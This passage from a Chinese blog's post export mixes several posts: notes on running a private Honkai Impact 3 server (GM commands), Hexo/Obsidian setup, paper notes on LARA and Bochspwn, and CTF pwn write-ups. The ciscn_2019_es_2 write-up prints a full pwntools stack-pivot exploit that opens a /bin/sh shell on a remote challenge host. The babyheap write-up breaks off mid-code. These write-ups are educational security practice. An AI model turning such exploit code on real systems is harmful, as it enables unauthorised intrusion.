class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">23</span> &lt;HTTP&gt; <span class="number">200</span> GET /sw.html</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">24</span> &lt;HTTP&gt; <span class="number">404</span> POST /apm/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">24</span> &lt;HTTP&gt; <span class="number">200</span> POST /common/h5log/log/batch</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /bh3_os/mdk/shield/api/verify</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP20:<span class="number">11</span>:<span class="number">27</span> &gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line">&lt;HTTP&gt; <span class="number">200</span> POST /account/device/api/listNewerDevices</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /data_abtest_api/config/experiment/list</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">27</span> &lt;HTTP&gt; <span class="number">200</span> POST /bh3_os/combo/granter/login/v2/login</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">28</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">28</span> &lt;HTTP&gt; <span class="number">200</span> GET /bh3_os/mdk/agreement/api/getAgreementInfos</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">28</span> &lt;HTTP&gt; <span class="number">200</span> POST /sdk/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">30</span> &lt;HTTP&gt; <span class="number">404</span> POST /apm/dataUpload</span><br><span class="line"><span class="number">20</span>:<span class="number">11</span>:<span class="number">30</span> &lt;HTTP&gt; <span class="number">200</span> POST /common/h5log/log/batch</span><br></pre></td></tr></table></figure>

<p><del>应该是query_gateway的响应url有问题，没有加端口：</del></p>
<p><del><img src="/posts/5fd89f19/image-20241121221642918.png" class="" title="image-20241121221642918"></del></p>
<p><del>在所有Global.config.Gameserver.Host后全部加上端口号（无果）。</del></p>
<p>怀疑是phpstudy与服务器的配置有误</p>
<p>正常情况下phpstudy日志信息</p>
<img src="/posts/5fd89f19/image-20241122113314979.png" class="" title="image-20241122113314979">

<p>而使用源码运行并没有产生新的日志，说明服务器端并没有向phpstudy发送请求</p>
<p>确定为DispatchController.cs文件的GetAssetBundleUrlList存在问题</p>
<p>修改返回值为正确值</p>
<p>然后发现服务器端成功出现对&#x2F;combo&#x2F;box&#x2F;api&#x2F;config&#x2F;sw&#x2F;precache的url请求，说明CS进行了进一步交互。</p>
<h4 id="下载活动资源失败，请确定读写权限以及存储空间后点击重试"><a href="#下载活动资源失败，请确定读写权限以及存储空间后点击重试" class="headerlink" title="下载活动资源失败，请确定读写权限以及存储空间后点击重试"></a>下载活动资源失败，请确定读写权限以及存储空间后点击重试</h4><img src="/posts/5fd89f19/image-20241122124133759.png" class="" title="image-20241122124133759">

<p>重启游戏继续报错，查看详细信息发现是声音映射文件出错</p>
<img src="/posts/5fd89f19/image-20241122120519897.png" class="" title="image-20241122120519897">

<p>对比query_gateway后发现缺少”manifest”字段</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;manifest&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Audio&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;platform&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Windows&quot;</span><span class="punctuation">:</span> <span class="string">&quot;manifest_0b6ab335.m&quot;</span>	<span class="comment">//固定值</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;revision&quot;</span><span class="punctuation">:</span> <span class="number">650645</span>	<span class="comment">// 固定值</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<h2 id="服务器使用"><a href="#服务器使用" class="headerlink" title="服务器使用"></a>服务器使用</h2><h3 id="GM指令"><a href="#GM指令" class="headerlink" title="GM指令"></a>GM指令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">------------------------------【GM 命令】----------------------------</span><br><span class="line">进入游戏在游戏内聊天窗口输入</span><br><span class="line">以下是可用的命令：</span><br><span class="line">-----------------</span><br><span class="line">level &lt;number&gt;</span><br><span class="line">设置玩家等级（人物88级，数字改多少就是多少级。最高应该是89）</span><br><span class="line">例如:</span><br><span class="line">level 88</span><br><span class="line">-----------------</span><br><span class="line">avatar &lt;add|modify&gt; &lt;avatarId&gt; &lt;...&gt;</span><br><span class="line">将角色添加到用户帐户或修改角色信息</span><br><span class="line">例如:</span><br><span class="line">avatar add 713</span><br><span class="line">avatar modify 713 Level 80</span><br><span class="line">请注意 字母L是大写的</span><br><span class="line">-----------------</span><br><span class="line">avatar modify -1 level 80（一键角色80级）</span><br><span class="line">avatar modify -1 Star 5（全部SSS级）</span><br><span class="line">-----------------</span><br><span class="line">give &lt;avatars|weapons|stigmata|materials|dress&gt;.</span><br><span class="line">获取所有角色， 、武器、徽章、材料或服装</span><br><span class="line">例如:</span><br><span class="line">give avatars（全部角色）</span><br><span class="line">give weapons（全部武器）</span><br><span class="line">give stigmata（全部圣痕）</span><br><span class="line">give materials（全部材料）危险操作</span><br><span class="line">give dress（全部衣服）</span><br><span class="line">give material-id 100 5（给id为5的物品加100个）</span><br><span class="line">give gold 999999（加金币）</span><br><span class="line">-----------------</span><br><span class="line">  give    avatars   weapons  stigmata  dress   materials</span><br><span class="line">获取所有    角色       武器      徽章    服装      材料（可能会炸存档，不建议使用）</span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>

<h3 id="删库重开"><a href="#删库重开" class="headerlink" title="删库重开"></a>删库重开</h3><p>删除mongod的<code>data</code>目录中所有内容即可。</p>
<h3 id="更新cg动画为中文"><a href="#更新cg动画为中文" class="headerlink" title="更新cg动画为中文"></a>更新cg动画为中文</h3><p>找国服的Video重命名后替换即可</p>
<h3 id="解包图片等资源"><a href="#解包图片等资源" class="headerlink" title="解包图片等资源"></a>解包图片等资源</h3><p>使用<a href="https://github.com/RazTools/Studio">AssetStudio</a>工具来提取.&#x2F;StreamingAssets&#x2F;Asb&#x2F;pc中的wmv数据。</p>
]]></content>
      <categories>
        <category>PemukulPaku</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>Obsidian+Hexo使用</title>
    <url>/posts/f1534c51.html</url>
    <content><![CDATA[<p>使用obsidian来管理博客，记录搭建的过程</p>
<h2 id="使用Obsidian的一些优势"><a href="#使用Obsidian的一些优势" class="headerlink" title="使用Obsidian的一些优势"></a>使用Obsidian的一些优势</h2><ol>
<li>方便管理</li>
<li>支持创建Front-Matter模版</li>
<li>支持内链</li>
</ol>
<h2 id="Obsidian内链"><a href="#Obsidian内链" class="headerlink" title="Obsidian内链"></a>Obsidian内链</h2><p>安装<a href="https://github.com/Cyrusky/hexo-backlink">Hexo-Backlink</a>插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-backlink</span><br></pre></td></tr></table></figure>

<p>在<code>_config.yaml</code>中添加<code>backlink:true</code>字段。</p>
<p>在obsidian中设置：<br>“设置” -&gt; “文件与链接” -&gt; “内部链接类型” , 设置为 “基于当前笔记的相对路径”<br>“设置” -&gt; “文件与链接” -&gt; “使用WIKI链接” , 打开</p>
<h3 id="问题解决-1：反向链接"><a href="#问题解决-1：反向链接" class="headerlink" title="问题解决 1：反向链接"></a>问题解决 1：反向链接</h3><p>研究了一下backlink这个插件，发现之前有人提过一个<a href="https://github.com/Cyrusky/hexo-backlink/issues/10">issue</a>，提到post文件名如果有日期格式的话插件就会报错，如果去掉只剩title就可以正常运行。  经验证目前应该仍然存在这个问题。</p>
<p>修改了下hexo-backlink源码的逻辑，上传到github上了<a href="https://github.com/Eknight-Eutopia/hexo-backlink/blob/main/src/index.ts">Eknight-Eutopia&#x2F;hexo-backlink</a></p>
<p>可以根据以上内容修改hexo博客里node_modules的hexo-backlink&#x2F;index.js的action函数<br>主要修改是添加了对日期的识别，如果为日期格式则只匹配其中的title（也就是说如果后续改title但没改文件名的话应该也是有问题的），这样基本上是可以使用的。<br>另外，看github上作者近期也没有更新，所以直接修改node_modules其实也不需要担心后面升级被覆盖了~~~</p>
<h3 id="问题解决2：模版渲染"><a href="#问题解决2：模版渲染" class="headerlink" title="问题解决2：模版渲染"></a>问题解决2：模版渲染</h3><p>在<code>_post</code>文件夹中创建了<code>Templates/templates_for_obsidian.md</code>来作为新建模版，但是后面每次启动hexo都会渲染该文件，导致自动为其设置了abbrlink，以至于后面所有的文件都是这个abbrlink，出现问题。</p>
<p>参考链接：<a href="https://hexo.io/zh-cn/docs/configuration#%E7%9B%AE%E5%BD%95">Hexo配置</a></p>
<p>禁止Hexo渲染模版文件即可：<br>在<code>_config.yml</code>中修改以下内容</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exclude template posts</span></span><br><span class="line"><span class="attr">skip_render:</span> <span class="string">&quot;_posts/Templates/*&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>BH3服务器开发与完善</title>
    <url>/posts/18d20718.html</url>
    <content><![CDATA[<h2 id="功能完善"><a href="#功能完善" class="headerlink" title="功能完善"></a>功能完善</h2><p>这部分的主要逻辑实现在GameServer目录中的Handlers中</p>
<h3 id="主线功能"><a href="#主线功能" class="headerlink" title="主线功能"></a>主线功能</h3><ul>
<li><a href="/posts/837b0a67.html" title="PemukulPaku-GetStageDataReqHandler">GetStageDataReq</a></li>
<li><a href="/posts/4eb70f95.html" title="PemukulPaku-StageEndRspHandler">StageEndRsp</a></li>
<li><a href="/posts/f6185e2f.html" title="PemukulPaku-TakeStageActChallengeRewardReqHandler">TakeStageActChallengeRewardReq</a></li>
<li><a href="/posts/edbf9f10.html" title="PemukulPaku-GetStageChapterReqHandler">GetStageChapterReq</a></li>
<li>FinishGuideReportReq</li>
<li>UpdateMissionProgressReq</li>
<li><a href="/posts/7a44cc62.html" title="PemukulPaku-GetStageDropDisplayReqHandler">GetStageDropDisplayReq</a></li>
</ul>
<h3 id="人物功能"><a href="#人物功能" class="headerlink" title="人物功能"></a>人物功能</h3><ul>
<li><a href="/posts/1b7a2e3d.html" title="PemukulPaku-AvatarStarUpReq">AvatarStarUpReq</a></li>
<li><a href="/posts/902f2cb2.html" title="PemukulPaku-AvatarFragmentTransformReq">AvatarFragmentTransformReq</a></li>
</ul>
<h3 id="材料装备功能"><a href="#材料装备功能" class="headerlink" title="材料装备功能"></a>材料装备功能</h3><ul>
<li><a href="/posts/2a86d11c.html" title="PemukulPaku-EquipmentSellReqHandler">EquipmentSellReq</a></li>
<li><a href="/posts/8fbda5e4.html" title="PemukulPaku-IslandDisjoinEquipmentReqHandler">IslandDisjoinEquipmentReq</a></li>
<li><a href="/posts/783a5418.html" title="PemukulPaku-EquipmentEvoReqHandler">EquipmentEvoReq</a></li>
<li><a href="/posts/7c3da2f0.html" title="PemukulPaku-GetEquipmentForgeDataReq">PemukulPaku-GetEquipmentForgeDataReq</a></li>
<li><a href="/posts/fcfb0211.html" title="PemukukPaku-ForgeEquipmentReq">ForgeEquipmentReq</a></li>
</ul>
<h3 id="商店与充值功能"><a href="#商店与充值功能" class="headerlink" title="商店与充值功能"></a>商店与充值功能</h3><ul>
<li><a href="/posts/6b761fa9.html" title="GetShopListReq">GetShopListReq</a></li>
<li><a href="/posts/308d4464.html" title="PemukulPaku-BuyGoodsReqHandler">BuyGoodsReq</a></li>
<li><a href="/posts/8bee2b6e.html" title="PemukulPaku-GetProductListReqHandler">GetProductListReq</a></li>
<li><a href="/posts/dc044fb2.html" title="PemukulPaku-BuyProductReq">BuyProductReq</a></li>
<li><a href="/posts/8063f392.html" title="PemukulPaku-GetShoppingMallListReqHandler">GetShoppingMallListReq</a></li>
<li><a href="/posts/10d8291a.html" title="PemukulPaku-GetVipRewardDataReq">GetVipRewardData</a></li>
<li><a href="/posts/3292b628.html" title="PemukulPaku-GetVipRewardReqHandler">GetVipRewardReq</a></li>
</ul>
<h3 id="深渊功能"><a href="#深渊功能" class="headerlink" title="深渊功能"></a>深渊功能</h3><ul>
<li><a href="/posts/ddb0d42f.html" title="PemukulPaku-GetMissionRewardReqHandler">GetMissionRewardReq</a></li>
</ul>
<h3 id="抽卡功能"><a href="#抽卡功能" class="headerlink" title="抽卡功能"></a>抽卡功能</h3><ul>
<li><a href="/posts/916f0cfe.html" title="GachaReqHandler">GachaReq</a></li>
<li><a href="/posts/c87482d2.html" title="GetGachaDisplayReq">GetGachaDisplayReq</a></li>
</ul>
<h3 id="日常功能"><a href="#日常功能" class="headerlink" title="日常功能"></a>日常功能</h3><ul>
<li>LoginWishGetMainDataReq(每日登录领取奖励)</li>
<li><a href="/posts/7a0445a.html" title="PemukulPaku-GetSignInRewardStatusReq">GetSignInRewardStatusReq</a></li>
<li>GetWeeklyRoutineActivityReq</li>
<li><a href="/posts/788ed292.html" title="PemukulPaku-GetInviteActivityInviteeDataReq">GetInviteActivityInviterDataReq</a></li>
<li><a href="/posts/ef0eaa0.html" title="PemukulPaku-GetInviteActivityInviterDataReq">GetInviteActivityInviterDataReq</a></li>
</ul>
<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><ul>
<li>GetHasGotItemIdListReq</li>
<li>GetArmadaDataReq(舰团)</li>
</ul>
]]></content>
      <categories>
        <category>PemukulPaku</category>
      </categories>
      <tags>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>LARA论文阅读笔记</title>
    <url>/posts/e3c41b31.html</url>
    <content><![CDATA[<h2 id="论文概述"><a href="#论文概述" class="headerlink" title="论文概述"></a>论文概述</h2><p><a href="https://www.usenix.org/system/files/usenixsecurity24-zhao.pdf">https://www.usenix.org/system/files/usenixsecurity24-zhao.pdf</a></p>
<p>（SaTC + 大模型）：使用污点分析技术来检测嵌入式系统漏洞的方法</p>
<img src="/posts/e3c41b31/file-20241217200349708.png" class="" title="file-20241217200349708">
<h2 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h2><ul>
<li>嵌入式固件中代码（<strong>输入处理函数</strong>）与数据（<strong>URI，KEY</strong>）的<strong>语义联系</strong>有助于识别污点分析的source点</li>
<li>将用户输入条目分为URI和KEY两类，并进行两类的mapping工作，有助于发现隐藏的URI和KEY<ul>
<li>关系图：<img src="/posts/e3c41b31/file-20241217204623878.png" class="" title="file-20241217204623878">
<ul>
<li>提取：先从前端获取一部分，然后在后端识别URI或KEY处理代码，再扩展</li>
</ul>
</li>
</ul>
</li>
<li>分为两个模块：<ul>
<li>pattern-based静态分析</li>
<li>LLM辅助分析：代码语义分析（大模型在总结代码语义上有很好的效果）</li>
<li>（sink点提取）</li>
</ul>
</li>
</ul>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><ul>
<li>添加大模型，通过语义理解的方式来辅助判断，显著提升了关键字识别的准确率</li>
<li>降低了漏洞检测假阳率</li>
<li>大模型与基于pattern匹配两种模式的结合</li>
<li>URI、KEY分离的思想</li>
</ul>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>203个设备，21个厂商<br>相较于SaTC，KARONTE分别多发现了556，602个漏洞，降低假阳率57.0%，54.3%</p>
<p>57个设备中发现了245个0-day，162个CVE</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
  </entry>
  <entry>
    <title>【ciscn_2019_es_2】WriteUp</title>
    <url>/posts/d92ba103.html</url>
    <content><![CDATA[<p><code>checksec</code>一下，发现只有NX防护。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn11/ciscn_2019_es_2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>使用ida打开，发现s存在溢出漏洞，但是只能溢出8字节，无法调用write等函数进行RetLibc。因此考虑栈迁移。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>栈迁移指在rbp指向的地址写入要篡改的地址，rbp+4写入leave_ret地址，这样在函数正常结束即将返回时，rsp指向rbp，rbp指向rbp指向的内容地址，rsp+4到leave_ret，使eip指向了leave_ret，因此导致程序又执行了leave_ret，再次将rsp移动到rbp，rsp+4，使eip指向了篡改地址+4的地址。</p>
<img src="/posts/d92ba103/%E6%A0%88%E8%BF%81%E7%A7%BB-1.png" class="" title="栈迁移-1">

<img src="/posts/d92ba103/%E6%A0%88%E8%BF%81%E7%A7%BB-2.png" class="" title="栈迁移-2">

<p>因此只需要向程序变量s写入要执行的指令，再栈迁移使eip指向s即可。</p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x080485BE&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27006</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line">system_addr = <span class="number">0x08048400</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次溢出泄漏ebp地址，用于栈迁移</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出，进行栈迁移，通过修改ebp来达到修改eip的目的 </span></span><br><span class="line">payload2 = flat(<span class="string">b&#x27;aaaa&#x27;</span>, system_addr, <span class="number">0</span>, ebp_addr-<span class="number">0x28</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2 += flat(ebp_addr-<span class="number">0x38</span>, leave_ret)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;\n&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>栈迁移</tag>
      </tags>
  </entry>
  <entry>
    <title>Bochspwn学习</title>
    <url>/posts/96f187a0.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>qiling为单线程的模拟，无法模拟并检测到内核中多线程由于条件竞争导致的内核漏洞。因此学习Bochspwn工具的使用，查看能否用于检测内核的多线程条件竞争的内核漏洞。</p>
<h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Bochspwn是一个系统范围的工具，旨在记录操作系统内核执行的内存访问，并检查它们，以搜索提示存在某些漏洞的模式，比如“double fetch”。有关内存引用的信息是通过在Bochs IA-32仿真器中运行目标操作系统，在Windows内核中发现了超过50个竞争条件类的漏洞。</p>
]]></content>
      <categories>
        <category>论文</category>
      </categories>
      <tags>
        <tag>论文复现</tag>
        <tag>内核</tag>
        <tag>条件竞争</tag>
      </tags>
  </entry>
  <entry>
    <title>【babyheap_0ctf_2017】WriteUp</title>
    <url>/posts/d4f04a55.html</url>
    <content><![CDATA[<p><code>checksec</code>查看，保护全开，可以查看是否有堆的漏洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/bronya/Documents/CTF/pwn18/babyheap_0ctf_2017&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>ida查看：</p>
<p><code>main</code>函数提供了菜单以及选择功能</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_CF4();</span><br><span class="line">    <span class="keyword">switch</span> ( sub_138C() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        Allocate(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        Fill(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        Free(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        Dump(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>allocate</code>函数根据大小申请堆空间</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">Allocate</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_138C();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Fill</code>函数向指定index堆块写入内容，注意此处没有对大小进行限制，因此可以考虑fastbin attack劫持</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Fill</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = sub_138C();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Dump</code>函数打印指定index的内容，可以用于泄漏main_arena地址，进一步泄漏libc基址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">Dump</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + 